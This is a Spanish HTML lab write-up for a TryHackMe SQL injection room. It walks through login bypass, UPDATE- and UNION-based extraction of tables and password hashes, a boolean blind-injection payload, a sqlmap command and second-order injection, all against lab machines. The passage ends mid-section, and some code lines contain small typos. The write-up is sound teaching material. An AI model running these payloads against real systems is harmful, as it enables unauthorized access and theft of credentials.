@@ -1,0 +1,1071 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <head>
+    <!-- Include Meta Tags Here -->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1 user-scalable=no, shrink-to-fit=no">
+<meta content='#000000' name='theme-color'/>
+<meta name="keywords" content="Site, Template, Theme">
+<title>CyberWiki | Introducción a las SQL injections</title>
+
+<!-- Open Graph general (Facebook, Pinterest & Google+) -->
+<meta name="og:title" content="CyberWiki | Introducción a las SQL injections">
+<meta name="og:description" content="En este laboratorio veremos una introducción a los ataques de SQL injections, así como algunos ejemplos prácticos de como podemos aplicarlas.">
+<meta name="og:image" content="../assets/images/Labs/IntroSQLi/sqli.png">
+<meta name="og:image:alt" content="CyberWiki | Introducción a las SQL injections">
+<meta name="og:url" content="http://localhost:4000/blog/IntroSQLi">
+<meta name="article:author" content="https://www.facebook.com/">
+<meta name="og:site_name" content="CyberWiki | Introducción a las SQL injections">
+<meta name="og:type" content="website">
+<!-- Twitter -->
+<meta property="twitter:card" content="summary_large_image"/>
+<meta name="twitter:title" content="CyberWiki | Introducción a las SQL injections">
+<meta name="twitter:description" content="En este laboratorio veremos una introducción a los ataques de SQL injections, así como algunos ejemplos prácticos de como podemos aplicarlas.">
+<meta name="twitter:site" content="@">
+<meta name="twitter:creator" content="@">
+<meta name="twitter:image:src" content="../assets/images/Labs/IntroSQLi/sqli.png">
+<!-- Search Engine -->
+<meta name="description" content="En este laboratorio veremos una introducción a los ataques de SQL injections, así como algunos ejemplos prácticos de como podemos aplicarlas.">
+<meta name="image" content="../assets/images/Labs/IntroSQLi/sqli.png">
+<!-- Schema.org for Google -->
+<meta itemprop="name" content="CyberWiki | Introducción a las SQL injections">
+<meta name="author" content="Jose Luis Venega"/>
+<meta itemprop="description" content="En este laboratorio veremos una introducción a los ataques de SQL injections, así como algunos ejemplos prácticos de como podemos aplicarlas.">
+<meta itemprop="image" content="../assets/images/Labs/IntroSQLi/sqli.png">
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
+
+    gtag('config', '');
+</script>
+    <title>CyberWiki</title>
+    <link rel="stylesheet" href="/assets/css/style.css">
+      <!-- Incluye el CSS de Prism.js -->
+    <link rel="stylesheet" href="../prism.css">
+    <script src="https://kit.fontawesome.com/6a97161b76.js" crossorigin="anonymous"></script>
+    <link rel="shortcut icon" href="/assets/images/favicon.png" type="image/x-icon">
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var titleElement = document.getElementById('page-title');
+            var icon = "/assest/images/favicon.png"; // Puedes usar cualquier emoji o icono aquí
+            titleElement.textContent = icon + " " + titleElement.textContent;
+        });
+    </script>
+</head>
+</head>
+
+<body>
+  <nav class="navbar is-black is-fixed-top is-rounded" role="navigation" aria-label="main navigation" id="navbar">
+    <div class="container">
+
+        <!-- logo or branding image on left side -->
+       
+        <!-- Logo o imagen de marca en el lado izquierdo -->
+        <div class="navbar-brand">
+            <a class="navbar-item"
+            href="http://localhost:4000/">
+            <img src="/assets/images/favicon.png" alt="Site Icon" style="width: 24px; height: 24px; vertical-align: middle;">
+                <i class="/assest/images/favicon.png"></i> <!-- Icono  -->
+                <strong>CyberWiki</strong>
+            </a>
+            <div class="navbar-burger" data-target="navbar-menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+
+        <!-- children of navbar-menu must be navbar-start and/or navbar-end -->
+        <div class="navbar-menu has-background-black" id="navbar-menu">
+            <!-- navbar items | left side -->
+            <!-- <div class="navbar-start">
+            </div> -->
+            <!-- navbar items | right side -->
+            <div class="navbar-end">
+                <a class="navbar-item "
+                    href="http://localhost:4000/">HOME</a>
+                <a class="navbar-item" href="http://localhost:4000/#about">ABOUT</a>
+                <a class="navbar-item" href="http://localhost:4000/#contact">CONTACT</a>
+                <a class="navbar-item "
+                    href="http://localhost:4000/blog">WRITE-UPs</a>
+                <a class="navbar-item "
+                    href="http://localhost:4000/project">LABS</a>
+                <!-- <div class="navbar-item has-dropdown is-hoverable">
+    <a class="navbar-link">
+        MORE
+    </a>
+    <div class="navbar-dropdown has-background-black is-left">
+        
+        
+        
+        
+        
+        
+        
+        
+        <a href="http://localhost:4000/project"
+            class="navbar-item has-text-grey-light ">
+            Projects
+        </a>
+        
+        
+        
+        <a href="http://localhost:4000/test-page"
+            class="navbar-item has-text-grey-light ">
+            Test Page
+        </a>
+        
+         -->
+        <!-- <hr class="navbar-divider">
+    <a class="navbar-item">
+      Report an issue
+    </a> -->
+    <!-- </div>
+</div> -->
+            </div>
+        </div>
+    </div>
+</nav>
+<!-- Bulma Navbar JS -->
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        /* Get all "navbar-burger" elements */
+        var $navbarBurgers = Array.prototype.slice.call(document.querySelectorAll('.navbar-burger'), 0);
+        /* Check if there are any navbar burgers */
+        if ($navbarBurgers.length > 0) {
+            /* Add a click event on each of them */
+            $navbarBurgers.forEach(function ($el) {
+                $el.addEventListener('click', function () {
+                    /* Get the target from the "data-target" attribute */
+                    var target = $el.dataset.target;
+                    var $target = document.getElementById(target);
+                    /* Toggle the class on both the "navbar-burger" and the "navbar-menu" */
+                    $el.classList.toggle('is-active');
+                    $target.classList.toggle('is-active');
+                });
+            });
+        }
+    });
+</script>
+  <section class="hero is-fullheight has-text-centered" id="post">
+    <div class="hero-body">
+      <div class="container">
+        <a href="/blog/IntroSQLi" class="has-text-black" id="title">
+          <h1 class="title has-text-centered is-2 has-text-weight-semibold ">Introducción a las SQL injections</h1>
+        </a>
+        <hr class="has-background-black">
+        <div class="columns is-variable is-5 has-text-centered">
+          <div class="column is-6">
+            <div style="text-align: center; ">
+              <img src="../assets/images/Labs/IntroSQLi/sqli.png" alt="Introducción a las SQL injections" id="post-image">
+            </div>
+          </div>
+          <div class="subtitle column is-5 has-text-left-desktop has-text-left-fullhd has-text-left-tablet has-text-center-mobile" style="text-align: left;" ">
+            
+            <p id="description" class="content is-small has-text-weight-medium is-uppercase">
+              En este laboratorio veremos una introducción a los ataques de SQL injections, así como algunos ejemplos prácticos de como podemos aplicarlas.
+              <!-- Enlace añadido aquí -->
+              <p class="subtitle is-uppercase is-6 has-text-weight-normal has-text-black-ter">Enlace de la room: 
+                <b><a href="https://tryhackme.com/r/room/sqlilab" target="page.enlace">Introducción a las SQL injections</a></b>
+              </p>
+                
+              <p class="subtitle is-6 is-uppercase has-text-weight-normal has-text-black-ter">Dificultad de la room: 
+                <b>Fácil</b>
+              </p>
+            <p class="subtitle is-6 is-uppercase has-text-weight-normal has-text-black-ter">Publicado en
+              <b>August 06, 2024</b> by <a href="https://github.com/Joseeelv" target="_blank"><b class="has-text-link"><u>Jose Luis Venega</u></b>
+              </a>
+            </p><p class="subtitle is-uppercase">
+              <i class="fas fa-tags"></i>
+              
+              
+              <span class="tag is-link">LAB</span>
+              
+              
+            </p><!-- <p class="subtitle is-uppercase"><i class="fas fa-clock"></i> <b class="has-text-link">
+                21 min
+              </b>READ</p> --></div>
+        </div>
+        <div class="content has-text-justified-desktop has-text-justified-fullhd has-text-justified has-text-justified-tablet has-text-left-mobile">
+          <p><h1 id="introducción-a-sql-injection">Introducción a SQL injection</h1>
+
+<p>Los ataques de inyección SQL es una técnica donde los atacantes pueden ejecutar peticiones maliciosas para poder ganar acceso en un panel de inicio de sesión o para obtener información de una base de dato sin tener acceso a la misma.</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      PHP
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-php">$query = "SELECT * FROM users WHERE username='" + $_POST["user"] + "' AND password= '" + $_POST["password"]$ + '";"</code></pre>
+  </div>
+</div>
+
+<p>Vemos que estamos haciendo una consulta donde estamos seleccionando todos los usuarios de la tabla <em>users</em> para obtener su usuario y su password.</p>
+
+<p>Si el atacante modifica dicha consulta de la manera que si cambia la parte de <code class="language-plaintext highlighter-rouge">$_POST["user"]</code> por <code class="language-plaintext highlighter-rouge">'OR 1=1 --</code> encontrará un exploit donde se ganará acceso ya que en SQL <code class="language-plaintext highlighter-rouge">1=1</code> es algo que siempre va a ser verdad y <code class="language-plaintext highlighter-rouge">--</code> (doble guion) comenta todo lo que lo precede, es decir, el campo password se comenta y no se tiene en cuenta.</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SELECT * FROM users WHERE username='' OR 1=1 -- AND password=''</code></pre>
+  </div>
+</div>
+
+<p>Como vemos, el campo password se ha puesto de un color diferente debido a que está comentado.</p>
+
+<p>Lo que hace la consulta anterior es devolver todos los usuarios de la tabla <em>users</em> donde su nombre es una cadena vacía (no devolvería ningún resultado) o verdad, algo que siempre se va a cumplir.</p>
+
+<h2 id="sql-injection-1-input-box-non-string">SQL Injection 1: <strong>Input Box Non-String</strong></h2>
+
+<p>Cuando hacemos un logueo, la aplicación lleva a cabo la siguiente consulta:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM users
+    WHERE profileID = 10 AND password 'ce44iqns...'</code></pre>
+  </div>
+</div>
+<p>Como vemos en este ejemplo de consulta, vemos que el campo profileID acepta valores / números enteros <code class="language-plaintext highlighter-rouge">profileID =10</code>, si no hay un tratamiento de esta condición podemos evadir la seguridad haciendo uso de una condición lógica como <code class="language-plaintext highlighter-rouge">1 or 1=1 --</code>.</p>
+
+<h2 id="sql-injection-2-input-box-string">SQL Injection 2: <strong>Input Box String</strong></h2>
+
+<p>Est desafío presenta la misma consulta a la hora de realizar un logueo.</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM users 
+    WHERE profileID ='10' AND password 'ce44iqns...'</code></pre>
+  </div>
+</div>
+
+<p>Con la diferencia que ahora el campo <code class="language-plaintext highlighter-rouge">profileID='10'</code> no acepta valores numéricos, si no que es una cadena de caracteres.</p>
+
+<p>Para poder evadir la seguridad en este caso, también podemos hacer uso de una condición lógica pero introduciendo cadenas en vez de valores numéricos <code class="language-plaintext highlighter-rouge">1' or '1'='1' --</code>.</p>
+
+<h2 id="sqlinjection-3-and-4-url-and-post-injection">SQL Injection 3 and 4: URL and POST Injection</h2>
+
+<p>Seguimos teniendo la misma consulta, pero ahora no podemos evadir la seguridad de la base de datos inyectando una consulta maliciosa a la aplicación vía login.</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM users 
+		WHERE profileID ='10' AND password 'ce44iqns...'</code></pre>
+  </div>
+</div>
+
+<p>Ya que se ha implementado un control del lado del cliente (client-side):</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      JavaScript
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-js">functionvalidateform() {
+  var profileID = document.inputForm.profileID.value;
+	var password = document.inputForm.password.value;
+	
+  if (/^[a-zA-Z0-9]*\$/.test(profileID) == false || 
+			/^[a-zA-Z0-9]*\$/.test(password) == false) {
+		alert("The input fields cannot contain special characters");
+	  return false;
+	}
+	if (profileID == null || password == null) {
+		alert("The input fields cannot be empty.");
+    return false;
+  }
+}</code></pre>
+  </div>
+</div>
+
+<p>Podemos leer este código y vemos que los campo <em>profileID</em> y <em>password</em> aceptan caracteres desde [a-Z] hasta [0-9].</p>
+
+<p>Es decir, el control desde el cliente solo mejora la experiencia de usuario pero cuando hablamos de seguridad vemos que el usuario sigue teniendo el control sobre los datos que acepta el cliente.</p>
+
+<p>Mediante el uso de la herramienta BurpSuite podemos evadir la validación que se realiza en el lado del cliente.</p>
+
+<h3 id="sqlinjection-3-url-injection">SQL Injection 3: URL Injection</h3>
+
+<p>Las URL injection se basan en peticiones <strong>GET</strong>  cuando se envía la petición de login.</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>El login y la validación del cliente se puede evadir desde la URL en la barra de navegación de esta manera: <code class="language-plaintext highlighter-rouge">http://ip_maquina:5000/sesqli3/login?profileID=1'or1=1--&amp;password=a</code>.</p>
+
+<h3 id="sqlinjection-4-post-injection">SQL Injection 4: POST Injection</h3>
+
+<p>Cuando enviamos la petición de login, se hace uso del método POST del protocolo http.</p>
+
+<p>Podemos o eliminar/desactivar el código JavaScript de validación o mediante BurpSuite interceptar la petición y modificarla.</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 1.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<h3 id="sqlinjection-5-update-statement">SQL Injection 5: UPDATE Statement</h3>
+
+<p>Si realizamos una inyección SQL cuando se realizar una consulta <em>UPDATE</em> el daño será más grave debido a que nos permitiría realizar cambios en la base de datos.</p>
+
+<p>En la aplicación de gestión de empleados, hay una página de edición de perfil, donde los empleados actualizan su perfil.</p>
+
+<p>Si vemos el código fuente de la página web, podemos identificar las columnas de la base de dato mediante su nombre.</p>
+
+<p>Ahora enumeraremos la base de datos vía UPDATE para obtener información de la base de datos.</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 2.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Para confirmar que estamos ante una vulnerabilidad podemos realizar una consulta donde inyectamos una consulta y vemos si se ha producido o no.</p>
+
+<p>Si el nombre de las columnas que aparecen no es el correcto, al realizar la inyección no se va a producir ningún cambio.</p>
+
+<p>Si los campos se actualizan podemos intentar identificar que base de datos se está usando, lo podemos hacer enviando un payload malicioso. Esto lo podemos para bases de datos MySQL, MSSQL, Oracle y SQLite:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-SQL"># MySQL and MSSQL*
+  ',nickName=@@version,email='
+# For Oracle*
+  ',nickName=(SELECT banner FROM v$version),email='
+# For SQLite*
+  ',nickName=sqlite_version(),email='</code></pre>
+  </div>
+</div>
+
+<p>Mediante esto vamos a obtener la versión de la misma.</p>
+
+<p>Una cosa importante es saber con que base de datos estamos tratando, esto nos facilita la compresión de como construir consultas maliciosas.</p>
+
+<p>Podemos enumerar la base de datos extrayendo todas las tablas de la misma.</p>
+
+<p>Vamos a realizar una subconsulta donde haremos uso de la función <code class="language-plaintext highlighter-rouge">group_concat()</code> que se utiliza para volcar todas las tablas simultáneamente, todo esto lo colocaremos en el campo <em>nickName</em> de la consulta:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='</code></pre>
+  </div>
+</div>
+
+<p>Como resultado, tenemos que obtenemos el nombre de la única tabla que existe en la base de datos:</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 3.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Ahora podemos obtener todos las columnas que componen a dicha tabla:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name = 'usertable'),email='</code></pre>
+  </div>
+</div>
+
+<p>Esta consulta nos devuelve todos las columnas de la tabla usertable:</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 4.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Conociendo el nombre de las columnas, podemos obtener la información que queremos de la base de datos.</p>
+
+<p>Por ejemplo, si queremos obtener el profileID ,name y password de los usuarios podemos ejecutar la siguiente consulta:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">',nickname = (SELECT group_concat(profileID || "," || name || "," ||password || ":") FROM usertable), email='</code></pre>
+  </div>
+</div>
+
+<p>Resultado de la consulta:</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 5.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Como vemos las contraseñas están en hasheadas, con la herramienta hash-identifier podemos saber que hash tienen y poder desencriptarlas.</p>
+
+<p>Finalmente podemos actualizar la contraseña del admin a la que queramos mediante:</p>
+<div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">', password='&lt;contraseña_hasheada&gt;' WHERE name='Admin'-- -</code></pre>
+  </div>
+<p>&lt;/div&gt;</p>
+
+<h1 id="vulnerable-startup">Vulnerable Startup</h1>
+
+<p>Vamos a ver ahora un ejemplo práctico de cada ataque de inyección SQL explicados anteriormente:</p>
+
+<h2 id="broken-authentication">Broken Authentication</h2>
+
+<p>Se realiza mediante la modificación de la petición con BurpSuite y el uso de la condición lógica <code class="language-plaintext highlighter-rouge">1' or 1=1--</code> , esto hace que ganemos acceso y encontremos la flag.</p>
+
+<h2 id="broken-authentication-2">Broken Authentication 2</h2>
+
+<p>Cuando nos loguemos, vemos que tenemos un rol. Además los datos de la consulta se almacenan en las cookies de la sesión del navegador en el campo Storage → <em>Value</em> (podemos acceder a ellas mediante F12 o inspeccionando la pagina web):</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 6.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Estas cookies están encriptadas, así que podemos usar alguna herramienta externa para desencriptarlas.</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 7.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Después de haber accedido mediante la condición lógica <code class="language-plaintext highlighter-rouge">1' or 1=1-- -</code>  como username, se puede ver la cookie desencriptada abajo.</p>
+
+<p>Podemos dumpear las contraseñas mediante la UNION basada en SQL injection, solo necesitamos 2 cosas:</p>
+
+<ul>
+  <li>El número de columnas en la consulta inyectada tiene que ser igual a la legítima.</li>
+  <li>Los tipos de datos deben de corresponder con los de la tabla legitima.</li>
+</ul>
+
+<p>Esto lo podemos saber si mandamos una consulta de la manera:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SELECT id, username FROM users WHERE username='" + username + "' AND password= '" + password + "'</code></pre>
+  </div>
+</div>
+
+<p>Si no conocemos el número de columnas, primero tendremos que enumerar el número de columnas inyectando consultas de la manera:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">1' UNION SELECT NULL -- -</code></pre>
+  </div>
+</div>
+
+<p>Poniendo tantos NULL como tablas creamos que debe de haber.</p>
+
+<p>Usando <code class="language-plaintext highlighter-rouge">'UNION SELECT 1,2-- -</code>  como username, coincidimos con el número de columnas de la consulta SQL original.</p>
+
+<p>Y donde antes ponía ‘Logged in as admin’ ahora pone ‘Logged in as 2’.</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 8.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Mediante el uso de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">PayloadsAllTheThings</a> la enumeración de tablas y columnas de una base de datos se hace más ameno debido a que ya no dan los payloads a usar para obtener dicha información.</p>
+
+<p>Como sabemos que el nombre de la tabla es <em>users</em> y tenemos la columna <em>password</em>, podemos hacer:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">' UNION SELECT 1, password FROM users-- -</code></pre>
+  </div>
+</div>
+
+<p>Si hacemos uso de group_concat() podemos obtener todas las passwords a la vez.</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">' UNION SELECT 1, group_concat(password) FROM users-- -</code></pre>
+  </div>
+</div>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 9.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Si ahora desencriptamos la cookies de sesión, tendremos todas las contraseñas.</p>
+
+<h2 id="broken-authentication-3-blind-injection">Broken Authentication 3 (Blind Injection)</h2>
+
+<p>Hay bases de datos que tienen protección en contra del método anterior (obtner las contraseñas a partir de la desencriptación de las cookies de sesión), para poder evitar esto vamos a hacer uso de Boolean-based blind SQL injection (inyección SQL booleana a ciegas) para obtener las contraseñas.</p>
+
+<p>La idea es mandar una consulta SQL preguntando por True o False (por eso lo de booleana) por cada carácter de la contraseña, observamos la respuesta de la petición para ver si la base de datos devuelve verdadero o falso.</p>
+
+<p>Si devuelve falso, nos mandará el mensaje de “usuario o contraseña incorrecto”.</p>
+
+<p>Para poder mandar peticiones de verdadero/falso preguntando a la base de datos si el carácter es verdadero o falso, vamos a necesitar saber que carácter se está comparando para ir pasando al siguiente cada vez que se acierte el carácter en esa posición.</p>
+
+<p>Para conseguir esto, vamos a hacer uso de la función:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SUBSTR(string, &lt;start&gt;, &lt;length&gt;)</code></pre>
+  </div>
+</div>
+
+<p>Donde <em>string</em> será la contraseña del admin, <em>start</em> será el inicio de la cadena y <em>length</em> será la longitud.</p>
+
+<p>Un ejemplo:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">-- Changing start --
+SUBSTR("THM{Blind}", 1,1) = T
+SUBSTR("THM{Blind}", 2,1) = H
+SUBSTR("THM{Blind}", 3,1) = M
+
+-- Changing length --
+SUBSTR("THM{Blind}", 1,3) = THM
+    </code></pre>
+  </div>
+</div>
+
+<p>A continuación vamos a introducir la contraseña del admin como una cadena en la función <code class="language-plaintext highlighter-rouge">SUBSTR</code>.</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">(SELECT password FROM users LIMIT 0,1)</code></pre>
+  </div>
+</div>
+
+<p>Lo que hace <code class="language-plaintext highlighter-rouge">LIMIT</code> es limitar la cantidad de datos devueltos por <code class="language-plaintext highlighter-rouge">SELECT</code> .</p>
+
+<p>Quedando de la manera:</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SUBSTR((SELECT password FROM users LIMIT 0,1)1,1)</code></pre>
+  </div>
+</div>
+
+<p>Ahora vamos a necesitar realizar la comparación entre caracteres para ver si es o no, pero como las contraseñas pueden tener mayúsculas y minúsculas vamos a traducirlas a hexadecimal.</p>
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'</code></pre>
+  </div>
+</div>
+
+<p>Siendo ‘t’ (0x74) y ‘T’(0x54).</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)</code></pre>
+  </div>
+</div>
+
+<p>Ahora hacemos uso de <code class="language-plaintext highlighter-rouge">CAST</code> para convertir la representación hexadecimal a un tipo de datos de texto en SQLite, además le añadimos los dos guiones para comentar el campo de la contraseña:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -</code></pre>
+  </div>
+</div>
+<p>Siendo esta la petición que finalmente hará la base de datos:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SELECT id, username FROM users WHERE username = 'admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)</code></pre>
+  </div>
+</div>
+<p>Si la aplicación nos devuelve un redirección 302, significa que hemos encontrado el primer carácter de la contraseña.</p>
+
+<p>Esto es muy tedioso ya que deberíamos de ir carácter a carácter, por tanto, vamos a hacer uso de un script que lo hace automáticamente.</p>
+
+<p>También podemos hacer uso de la herramienta externa <code class="language-plaintext highlighter-rouge">sqlmap</code> para llevar a cabo estos ataques con los parámetros:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-bash">sqlmap -u http://MACHINE_IP:5000/challenge3/login --data="username=admin&amp;password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dumpy</code></pre>
+  </div>
+</div>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 10.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<h2 id="vulnerable-notes">Vulnerable Notes</h2>
+
+<p>Nos hemos topado con una base de datos que tiene todos los fallos anteriores fixed, por tanto, tendremos que buscar una nueva manera de poder acceder a la base de datos.</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 11.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Aquí entran las <em>notes</em> que son una función donde se pueden añadir nuevas notas. Estas no son directamente vulnerables ya que se insertan notas de forma segura ya que usa <em>consultas paramétricas</em>. Con este tipo de consultas, la declaración se especifica con <em>placeholders</em> que son “?”.</p>
+
+<p>Luego el usuario introduce cada parámetro en la consulta.</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">INSERT INTO notes (username, title, note) VALUES (?,?,?)</code></pre>
+  </div>
+</div>
+
+<p>Estas consultas hace que la base de datos pueda diferenciar entre código y datos, independientemente la entrada de los datos.</p>
+
+<p>Aunque se hagan uso de consultas parametrizadas, el servidor seguirá aceptando “datos maliciosos” y las pondrá en la base de datos.</p>
+
+<p>Sin embargo, la consulta que obtiene todas la notas que pertenece a un usuario no hace uso de consultas parametrizadas, por tanto, se puede concatenar el nombre de usuario directamente en la consulta, haciéndola vulnerable a SQL injection.</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SELECT title, note FROM notes WHERE name = '" + nombre de usuario + "'</code></pre>
+  </div>
+</div>
+
+<p>Esto significa que si añadimos un usuario malicioso, todo estará normal hasta que el usuario navegue a la página de las notas.</p>
+
+<div style="text-align: center; ">
+    <img src="../assets/images/Labs/IntroSQLi/Untitled 12.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Podemos crear un usuario malicioso mediante <code class="language-plaintext highlighter-rouge">' UNION SELECT 1,2'</code> , donde la aplicación realizará la siguiente consulta:</p>
+
+<div style="text-align:center;">
+ <div class="code-container">
+    <div class="code-header">
+      SQL
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre><code class="language-sql">SELECT title, note FROM notes WHERE name='" UNION SELECT 1,2"'</code></pre>
+  </div>
+</div>
+
+<p>Con este conocimiento, podemos explotar la base de datos para obtener todas las tablas de la misma y buscar información.</p>
+
+<p>Lo podemos hacer como el ejemplo anterior, donde nos logueamos con un usuario malicioso, de la manera:</p>
+
